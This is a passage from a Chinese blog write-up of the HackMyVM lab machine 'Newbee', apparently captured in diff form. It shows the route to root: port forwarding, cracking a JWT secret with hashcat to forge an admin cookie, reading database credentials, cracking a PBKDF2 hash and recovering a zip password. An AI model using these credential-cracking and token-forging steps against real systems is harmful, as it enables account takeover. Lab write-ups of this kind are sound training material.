+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">debian@Newbee:~$ cat config.php</span><br><span class="line">&lt;?php</span><br><span class="line">$servername = &quot;localhost&quot;;</span><br><span class="line">$username = &quot;root&quot;;</span><br><span class="line">$password = &quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$conn = new mysqli($servername, $username, $password);</span><br><span class="line"></span><br><span class="line">............</span><br><span class="line">............</span><br></pre></td></tr></table></figure>
+
+<p>要拿到数据库的密码</p>
+<p>查看端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">debian@Newbee:~$ ss -lntup</span><br><span class="line">Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port Process</span><br><span class="line">udp    UNCONN  0       0              0.0.0.0:68          0.0.0.0:*</span><br><span class="line">tcp    LISTEN  0       128            0.0.0.0:22          0.0.0.0:*</span><br><span class="line">tcp    LISTEN  0       80           127.0.0.1:3306        0.0.0.0:*</span><br><span class="line">tcp    LISTEN  0       128          127.0.0.1:5000        0.0.0.0:*</span><br><span class="line">tcp    LISTEN  0       128               [::]:22             [::]:*</span><br><span class="line">tcp    LISTEN  0       511                  *:80                *:*</span><br></pre></td></tr></table></figure>
+
+<p>可以发现本地有5000端口，用socat将5000端口转发出去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debian@Newbee:~$ socat TCP-LISTEN:5001,fork TCP4:127.0.0.1:5000</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/Newbee1.png"></p>
+<p>是一个留言板，登录处除了admin，其他的都可以随意登录，cookie里有一个jwt，可以猜测是jwt伪造</p>
+<p>可以用hashcat爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# hashcat -a 0 -m 16500 ./1 /usr/share/wordlists/rockyou.txt</span><br><span class="line">hashcat (v6.2.6) starting</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]</span><br><span class="line">============================================================================================================================================</span><br><span class="line">* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12500H, 2917/5898 MB (1024 MB allocatable), 8MCU</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger set to 90c</span><br><span class="line"></span><br><span class="line">Host memory required for this attack: 2 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344385</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line"></span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMzEyMyIsImV4cCI6MTc0MzAyNTM4OH0.qTMF9XS0BYo7nKIDg9rFr1qmUfR4btXsLS7GZv2QVW4:noob</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 16500 (JWT (JSON Web Token))</span><br><span class="line">Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZS...v2QVW4</span><br><span class="line">Time.Started.....: Wed Mar 26 08:44:45 2025 (3 secs)</span><br><span class="line">Time.Estimated...: Wed Mar 26 08:44:48 2025 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.#1.........:  2052.7 kH/s (0.87ms) @ Accel:512 Loops:1 Thr:1 Vec:8</span><br><span class="line">Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)</span><br><span class="line">Progress.........: 5025792/14344385 (35.04%)</span><br><span class="line">Rejected.........: 0/5025792 (0.00%)</span><br><span class="line">Restore.Point....: 5021696/14344385 (35.01%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.#1....: noobface888 -&gt; nona1807</span><br><span class="line">Hardware.Mon.#1..: Util: 44%</span><br><span class="line"></span><br><span class="line">Started: Wed Mar 26 08:44:44 2025</span><br><span class="line">Stopped: Wed Mar 26 08:44:49 2025</span><br></pre></td></tr></table></figure>
+
+<p>noob就是密钥，用户名伪造成admin，可以看到留言板的内容</p>
+<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/Newbee2.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">debian@Newbee:~$ mysql -uroot -pTheStrongestPasswordHYHcreated</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 5</span><br><span class="line">Server version: 10.11.6-MariaDB-0+deb12u1 Debian 12</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">No entry for terminal type &quot;unknown&quot;;</span><br><span class="line">using dumb terminal settings.</span><br><span class="line">No entry for terminal type &quot;unknown&quot;;</span><br><span class="line">using dumb terminal settings.</span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>user库的user表里有debian的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database changed</span><br><span class="line">MariaDB [user]&gt; select * from user;</span><br><span class="line">+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+</span><br><span class="line">| id | username | passwd</span><br><span class="line">                   | salt                             | passwd_hash_algo |</span><br><span class="line">+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+</span><br><span class="line">|  1 | debian   | 2c082e3ff2ca15e3b24f815d70653f0dead09534495069dd140e19adb2d117266cc4b1de8daf55c7c4827a0a5ccf70c6f537ffc4ddc74db4865c41c0 | 8bf3e3452b78544f8bee9400d6936d34 | pbdf2$50500$60   |</span><br><span class="line">+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+</span><br><span class="line">1 row in set (0.001 sec)</span><br></pre></td></tr></table></figure>
+
+<p>pbdf2爆破参考<a target="_blank" rel="noopener" href="https://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256">https://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# cat 2</span><br><span class="line">sha256:50500:i/PjRSt4VE+L7pQA1pNtNA==:LAguP/LKFeOyT4FdcGU/DerQlTRJUGndFA4ZrbLRFyZsxLHeja9Vx8SCegpcz3DG9Tf/xN3HTbSGXEHA</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# hashcat -a 0 ./2 /usr/share/wordlists/rockyou.txt</span><br><span class="line">hashcat (v6.2.6) starting in autodetect mode</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]</span><br><span class="line">============================================================================================================================================</span><br><span class="line">* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12500H, 2917/5898 MB (1024 MB allocatable), 8MCU</span><br><span class="line"></span><br><span class="line">Hash-mode was not specified with -m. Attempting to auto-detect hash mode.</span><br><span class="line">The following mode was auto-detected as the only one matching your input hash:</span><br><span class="line"></span><br><span class="line">10900 | PBKDF2-HMAC-SHA256 | Generic KDF</span><br><span class="line"></span><br><span class="line">NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!</span><br><span class="line">Do NOT report auto-detect issues unless you are certain of the hash type.</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">INFO: All hashes found as potfile and/or empty entries! Use --show to display them.</span><br><span class="line"></span><br><span class="line">Started: Wed Mar 26 08:49:58 2025</span><br><span class="line">Stopped: Wed Mar 26 08:49:59 2025</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# hashcat ./2 --show</span><br><span class="line">Hash-mode was not specified with -m. Attempting to auto-detect hash mode.</span><br><span class="line">The following mode was auto-detected as the only one matching your input hash:</span><br><span class="line"></span><br><span class="line">10900 | PBKDF2-HMAC-SHA256 | Generic KDF</span><br><span class="line"></span><br><span class="line">NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!</span><br><span class="line">Do NOT report auto-detect issues unless you are certain of the hash type.</span><br><span class="line"></span><br><span class="line">sha256:50500:i/PjRSt4VE+L7pQA1pNtNA==:LAguP/LKFeOyT4FdcGU/DerQlTRJUGndFA4ZrbLRFyZsxLHeja9Vx8SCegpcz3DG9Tf/xN3HTbSGXEHA:1qaz2wsx</span><br></pre></td></tr></table></figure>
+
+<p>用户home目录下还有一个.secret目录，里面有一个密码的压缩包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">debian@Newbee:~$ cd .secret/</span><br><span class="line">debian@Newbee:~/.secret$ ls</span><br><span class="line">hint.txt  password.zip</span><br><span class="line">debian@Newbee:~/.secret$ cat hint.txt</span><br><span class="line">password is md5(key)</span><br><span class="line"></span><br><span class="line">and key is in mysql!!!!!!</span><br></pre></td></tr></table></figure>
+
+<p>密码是1qaz2wsx的md5</p>
+<p>图片是马赛克，网上有一个项目是用来恢复马赛克的</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/spipm/Depixelization_poc">https://github.com/spipm/Depixelization_poc</a></p>
+<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/Newbee3.png"></p>
+<p>其实也不用跑，图片的原图就是这个项目的示例图片</p>
+<p>密码是<code>hellofromtheotherside</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">debian@Newbee:/tmp$ su - root</span><br><span class="line">Password:</span><br><span class="line">root@Newbee:~#</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag"># 靶机</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/03/21/Chromee/" rel="prev" title="HackmyVM-Chromee">
+      <i class="fa fa-chevron-left"></i> HackmyVM-Chromee
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/03/26/Untitled/" rel="next" title="">
+       <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#80%E7%AB%AF%E5%8F%A3"><span class="nav-number">2.</span> <span class="nav-text">80端口</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">lvzhouhang</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">53</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lvzhouhang</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">189k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">2:52</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/xxx/anime.min.js"></script>
+  <script src="/xxx/velocity/velocity.min.js"></script>
+  <script src="/xxx/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
